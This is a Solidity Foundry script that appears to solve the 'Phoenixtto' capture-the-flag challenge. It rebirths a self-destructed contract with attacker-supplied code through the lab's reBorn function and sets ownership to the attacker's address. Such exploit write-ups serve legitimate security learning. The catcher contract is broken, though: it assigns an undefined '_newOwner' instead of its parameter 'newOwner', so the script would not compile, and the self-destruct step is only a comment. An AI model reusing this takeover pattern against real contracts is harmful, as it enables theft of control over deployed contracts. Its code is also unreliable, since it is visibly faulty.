// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../src/ChallengePhoenixtto.sol";
import "forge-std/Script.sol";

contract ChallengePhoenixttoScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        address challengeInstance = address(0x0); // DEPLOYED CHALLENGE INSTANCE
        address newOwner = address(0x0); // YOUR ADDRESS
        _capturePhoenixtto(challengeInstance, newOwner);

        vm.stopBroadcast();
    }

    function _capturePhoenixtto(address _challengeInstance, address _newOwner)
        internal
    {
        Laboratory laboratory = Laboratory(_challengeInstance);

        // 1. selfdestruct existing Phoenixtto
        // Phoenixtto(laboratory.addr()).capture(""); -> Needs to be called directly by attacker, else `tx.origin != msg.sender` check will fail

        // 2. Deploy Phoenixtto with own code
        laboratory.reBorn(type(PhoenixttoCatcher).creationCode);

        // 3. Capture Phoenixtto
        PhoenixttoCatcher phoenixttoCatcher = PhoenixttoCatcher(
            laboratory.addr()
        );
        phoenixttoCatcher.capturePhoenixtto(_newOwner);
        require(phoenixttoCatcher.owner() == _newOwner, "PhoenixttoCatcher: NOT CAUGHT");

        require(laboratory.isCaught(), "Laboratory: NOT CAUGHT");
    }
}

contract PhoenixttoCatcher {
    address public owner;
    bool private _isBorn;

    function reBorn() external {}

    function capturePhoenixtto(address newOwner) external {
        _isBorn = true;
        owner = _newOwner;
    }
}
